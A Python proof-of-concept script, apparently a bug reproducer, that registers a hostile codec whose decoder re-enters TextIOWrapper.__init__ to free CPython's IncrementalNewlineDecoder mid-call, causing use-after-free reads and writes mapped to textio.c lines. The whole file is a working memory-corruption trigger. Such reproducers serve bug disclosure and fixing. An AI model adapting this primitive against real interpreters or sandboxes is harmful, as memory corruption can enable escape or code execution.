"""_PyIncrementalNewlineDecoder_decode / IncrementalNewlineDecoder.getstate
dereference (and WRITE to) their own `self` after the *inner* decoder ran
arbitrary user Python.

  Modules/_io/textio.c:338-339  output = self->decoder.decode(input, final)  <- user Python
  Modules/_io/textio.c:350      if (self->pendingcr && ...)                  <- UAF read
  Modules/_io/textio.c:365/380  self->pendingcr = 0 / 1                      <- UAF WRITE
  Modules/_io/textio.c:389      int seennl = self->seennl                    <- UAF read
  Modules/_io/textio.c:435      else if (!self->translate)                   <- UAF read
  Modules/_io/textio.c:511      self->seennl |= seennl                       <- UAF WRITE

`self` (the IncrementalNewlineDecoder) is owned only by the TextIOWrapper's
`self->decoder` slot; the caller passes it borrowed
(textio.c:2092 `_PyIncrementalNewlineDecoder_decode(self->decoder, ...)`).
A re-entrant `TextIOWrapper.__init__` runs `Py_CLEAR(self->decoder)` at
textio.c:1216 and frees it under the running callee.

Modes:
  (default)  decode-path  -> UAF read + UAF WRITE
  --getstate getstate path (textio.c:575) -> UAF read
  --pyio     run the pure-Python twin _pyio as the differential oracle
"""

import codecs
import sys

MODE_GETSTATE = "--getstate" in sys.argv
MODE_DEL = "--del" in sys.argv
if "--pyio" in sys.argv:
    import _pyio as io
else:
    import io

DATA = b"hello\r\nworld\r\n" * 4096


class Detonator(str):
    """A str subclass whose teardown detonates.

    Used to move the free past textio.c:350 so the FIRST post-free access is
    the read-modify-WRITE `self->seennl |= seennl;` at textio.c:511.
    The Py_DECREF(output) that runs __del__ is textio.c:504.
    """

    def __del__(self):
        _detonate()

tw = None
fired = False


def _detonate():
    """Free the IncrementalNewlineDecoder that is currently on the C stack."""
    global fired
    if tw is not None and not fired:
        fired = True
        tw.__init__(io.BytesIO(b"x" * 32), encoding="evilcodec")


class EvilDecoder(codecs.IncrementalDecoder):
    def __init__(self, errors="strict"):
        self.errors = errors

    def decode(self, input, final=False):
        text = bytes(input).decode("latin-1")
        if MODE_DEL:
            return Detonator(text)
        if not MODE_GETSTATE:
            _detonate()
        return text

    def getstate(self):
        if MODE_GETSTATE:
            _detonate()
        return (b"", 0)

    def setstate(self, state):
        pass

    def reset(self):
        pass


class EvilEncoder(codecs.IncrementalEncoder):
    def encode(self, input, final=False):
        return input.encode("latin-1")

    def reset(self):
        pass

    def getstate(self):
        return 0

    def setstate(self, state):
        pass


def _search(name):
    if name != "evilcodec":
        return None
    return codecs.CodecInfo(
        name="evilcodec",
        encode=lambda s, errors="strict": (s.encode("latin-1"), len(s)),
        decode=lambda b, errors="strict": (bytes(b).decode("latin-1"), len(b)),
        incrementalencoder=EvilEncoder,
        incrementaldecoder=EvilDecoder,
    )


codecs.register(_search)

# newline=None (the default) makes _io wrap the codec's decoder in an
# IncrementalNewlineDecoder -- that wrapper is the object that gets freed.
tw = io.TextIOWrapper(io.BytesIO(DATA), encoding="evilcodec")

print("mode:", "getstate" if MODE_GETSTATE else ("del" if MODE_DEL else "decode"), flush=True)
try:
    if MODE_GETSTATE:
        out = tw.read(1)  # goes through textiowrapper_read_chunk -> getstate()
    else:
        out = tw.read()  # n<0 -> _PyIncrementalNewlineDecoder_decode(final=1)
except Exception as exc:  # noqa: BLE001
    print("raised", type(exc).__name__, exc, flush=True)
else:
    print("returned", len(out), "chars", flush=True)
print("survived", flush=True)
